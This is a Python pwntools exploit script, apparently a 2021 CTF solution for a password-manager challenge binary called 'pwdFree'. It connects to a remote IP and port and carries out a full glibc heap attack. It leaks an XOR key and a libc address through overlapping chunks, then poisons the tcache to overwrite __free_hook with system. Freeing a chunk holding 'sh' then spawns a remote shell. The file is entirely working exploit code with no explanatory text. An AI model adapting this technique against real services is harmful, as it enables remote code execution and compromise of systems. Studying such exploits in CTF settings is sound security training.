# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './pwdFree'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = '47.104.71.220'
    port = '38562'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(num):
    sla(':',num)

def add(id,size,pwd):
    cmd(1)
    sla('Input The ID You Want Save:',id)
    sla('Length Of Your Pwd:',size)
    sa('Your Pwd:',pwd)

def delete(id):
    cmd(4)
    sla('Idx you want 2 Delete:',id)

def show(id):
    cmd(3)
    sla('Want Check:',id)

def edit(id,text):
    cmd(2)
    sl(str(id))
    sleep(0.1)
    se(text)

def decode(payload):
    global key
    rst = ''
    for i in range(0, len(payload) , 8):
        rst += p64( u64 ( payload[i:i+8] ) ^ key)
    return rst

# key 0x0000000000004040

add('a', 0xf8 , '\x00'*8 + '\n')
ru('Save ID:')
key = u64(p.recv(8))
lg('key',key)

for i in range(6):
    add('a', 0xf8 , 'a'*8 + '\n')

add('a', 0xf8 , 'a'*8 + '\n') #6
add('a', 0xf8 , 'a'*8 + '\n')
add('a', 0xf8 , 'a'*8 + '\n')
add('a', 0xf8 , 'a'*8 + '\n') #9

add('a',0x18,p64(0x6873^key) + '\n') #10

for i in range(6):
    delete(i)

delete(9)
delete(7)

payload = flat(0,0,0x100*3 ).rjust(0xf8,'\x00')

add( 'a', 0xf8 , decode(payload)) #0
delete(6)
delete(10)

# 8 , 0
add( 'a', 0x78 , 'a\n') #1
add( 'a', 0x78 , 'a\n') #2

show(8)
ru('Pwd is: ')
__malloc_hook = u64(p.recv(8)) ^ key 
lg('__malloc_hook',__malloc_hook)

libc.address = __malloc_hook - libc.sym['__malloc_hook'] - 0x70
__free_hook = libc.sym['__free_hook']
system = libc.sym['system']

add( 'a', 0x78 , 'a\n') #3
add( 'a', 0x78 , 'a\n') #4

delete(3)
edit(8,p64(__free_hook))

sleep(0.1)

add('a', 0x78 , 'a\n')

lg('__free_hook',__free_hook)
lg('system',system)


add('a', 0x78 , p64(system ^ key) + p64(0^key)*14 )
delete(11)


p.interactive()

'''
@File    :   pwdFree.py
@Time    :   2021/08/21 20:08:21
@Author  :   Niyah 
'''